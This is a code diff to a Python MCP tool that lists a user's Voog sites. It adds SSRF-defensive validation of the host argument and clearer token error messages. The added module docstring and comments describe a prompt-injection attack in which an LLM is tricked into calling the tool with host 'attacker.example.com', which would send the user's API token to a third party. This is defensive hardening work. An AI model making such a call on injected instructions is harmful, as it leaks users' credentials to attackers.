@@ -20,6 +20,11 @@ widens the exposure surface. Mitigation:
     a description-level warning that it will appear in transcripts and
     host logs.
   - `host` defaults to `www.voog.com` (Voog's canonical admin host).
+  - `host` is validated against an SSRF-defensive allowlist (see
+    `_validate_host` below). This prevents a prompt-injection attack
+    where an LLM is tricked into calling `voog_list_my_sites(host=
+    "attacker.example.com", token_env="VOOG_API_KEY")` and shipping
+    the user's token to a third party as `X-API-Token: <secret>`.
 
 This tool ALSO does NOT use the server's per-site client cache (it has
 no `site` argument, and the operator may be probing a tenant not in
@@ -29,7 +34,9 @@ without a `site` argument — see _BUILTIN_NO_SITE_TOOLS in server.py.
 SECURITY.md (Phase 6, MD6) will document the exposure surface in detail.
 """
 
+import ipaddress
 import os
+import re
 
 from mcp.types import CallToolResult, TextContent, Tool
 
@@ -37,6 +44,104 @@ from voog.client import VoogClient
 from voog.errors import error_response, success_response
 
 _DEFAULT_HOST = "www.voog.com"
+
+# SSRF-defensive host validation. Rejects classes of input that an
+# attacker could use to redirect the request away from a legitimate
+# Voog admin endpoint. NOT a Voog-domain allowlist — tenants can host
+# the admin API on their own primary domain (e.g. `stellasoomlais.com`),
+# so a `*.voog.com` allowlist would reject real-world setups. Instead:
+# reject local / private / reserved targets that no legitimate Voog
+# tenant would ever use.
+_HOSTNAME_RE = re.compile(r"^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$")
+_PRIVATE_HOST_SUFFIXES = (
+    ".local",
+    ".internal",
+    ".intranet",
+    ".onion",
+    ".lan",
+    ".home",
+    ".corp",
+    ".test",
+    ".example",
+    ".invalid",
+    ".localhost",
+)
+_REJECTED_HOSTS = frozenset(
+    {
+        "localhost",
+        "ip6-localhost",
+        "ip6-loopback",
+        "broadcasthost",
+    }
+)
+
+
+def _validate_host(host: str) -> str | None:
+    """SSRF-defensive validation for the `host` arg.
+
+    Returns an error message string when the host should be rejected;
+    returns ``None`` when the host is acceptable. Rejects:
+
+      - empty / whitespace
+      - explicit ports (host:8080) — Voog admin is HTTPS:443 only;
+        an embedded port is a strong signal of redirection
+      - userinfo (user@host) and credentials in URL form
+      - scheme prefix (`http://`, `https://`, etc.) — host must be
+        bare; the schema already separates concerns
+      - localhost and loopback hostnames
+      - raw IPv4 / IPv6 addresses, including loopback / private /
+        link-local / reserved ranges
+      - private-use TLDs (.local, .internal, .intranet, .onion, .test, …)
+      - non-DNS characters (anything outside ``[a-z0-9.-]`` after
+        lowercasing — covers Unicode IDN homograph attacks too)
+    """
+    if not host or not host.strip():
+        return "voog_list_my_sites: host must be non-empty"
+    h = host.strip().lower()
+
+    # Scheme / userinfo / port — none of these belong in a bare hostname.
+    if "://" in h:
+        return f"voog_list_my_sites: host must be bare (no scheme), got {host!r}"
+    if "@" in h:
+        return f"voog_list_my_sites: host must not contain '@' (no userinfo), got {host!r}"
+    if "/" in h or "?" in h or "#" in h:
+        return f"voog_list_my_sites: host must be a bare hostname (no path), got {host!r}"
+    if ":" in h:
+        # Could be IPv6 in brackets or an explicit port — reject both.
+        # Voog admin is always HTTPS:443.
+        return f"voog_list_my_sites: host must not contain ':' (no port / IPv6), got {host!r}"
+
+    # Loopback / well-known local names.
+    if h in _REJECTED_HOSTS:
+        return f"voog_list_my_sites: host {host!r} is a loopback / reserved name"
+
+    # Raw IPv4 — reject regardless of range. Tenants identify by
+    # hostname, not by IP; an IP in this slot is exclusively an
+    # attempt to bypass DNS-based defenses.
+    try:
+        ipaddress.ip_address(h)
+        return f"voog_list_my_sites: host {host!r} is a raw IP address; use a hostname"
+    except ValueError:
+        pass
+
+    # Private-use TLDs.
+    for suffix in _PRIVATE_HOST_SUFFIXES:
+        if h.endswith(suffix) or h == suffix.lstrip("."):
+            return f"voog_list_my_sites: host {host!r} uses a private / reserved TLD ({suffix})"
+
+    # DNS-name shape (allowed chars + label structure). This also
+    # blocks IDN homograph attacks (Unicode codepoints don't match
+    # the ASCII regex), forcing the caller to use punycode if they
+    # genuinely need IDN — which then passes the regex but at least
+    # leaves the operator a visible audit trail.
+    if not _HOSTNAME_RE.match(h):
+        return (
+            f"voog_list_my_sites: host {host!r} is not a valid DNS hostname "
+            "(use lowercase letters, digits, '.', '-' only; "
+            "punycode for IDN)"
+        )
+
+    return None
 
 
 def get_tools() -> list[Tool]:
@@ -84,7 +189,11 @@ def get_tools() -> list[Tool]:
                         "minLength": 1,
                         "description": (
                             "Admin host to probe (default www.voog.com). "
-                            "Override for tenants on private domains."
+                            "Override for tenants on their own primary "
+                            "domain (e.g. 'stellasoomlais.com'). Validated "
+                            "against SSRF-defensive rules — localhost, "
+                            "raw IPs, private TLDs, embedded ports, and "
+                            "URL schemes are rejected."
                         ),
                     },
                 },
@@ -112,10 +221,18 @@ def _resolve_token(arguments: dict) -> tuple[str | None, str | None]:
         if not isinstance(token_env, str) or not token_env.strip():
             return None, "voog_list_my_sites: token_env must be a non-empty string"
         resolved = os.environ.get(token_env)
-        if not resolved:
+        # Distinguish "unset" from "set-but-empty" so operators
+        # who have e.g. `VOOG_API_KEY=` in their .env (truncated
+        # paste, accidental keystroke) get a useful error message.
+        if resolved is None:
             return None, (
                 f"voog_list_my_sites: env var {token_env!r} is not set "
                 "in this process's environment"
+            )
+        if not resolved.strip():
+            return None, (
+                f"voog_list_my_sites: env var {token_env!r} is set but empty "
+                "(check your .env or shell export)"
             )
         return resolved, None
     if token:
@@ -136,8 +253,13 @@ def _voog_list_my_sites(arguments: dict, _unused_client) -> list[TextContent] | 
     if err:
         return error_response(err)
     host = (arguments.get("host") or _DEFAULT_HOST).strip()
-    if not host:
-        return error_response("voog_list_my_sites: host must be non-empty")
+    # SSRF-defensive validation — see _validate_host docstring.
+    # This is THE primary mitigation against prompt-injection
+    # token-exfiltration via this tool: an LLM-controllable host
+    # parameter that ships the user's token in an HTTP header.
+    err = _validate_host(host)
+    if err:
+        return error_response(err)
     try:
         client = VoogClient(host=host, api_token=token)
         sites = client.get("/me/sites")
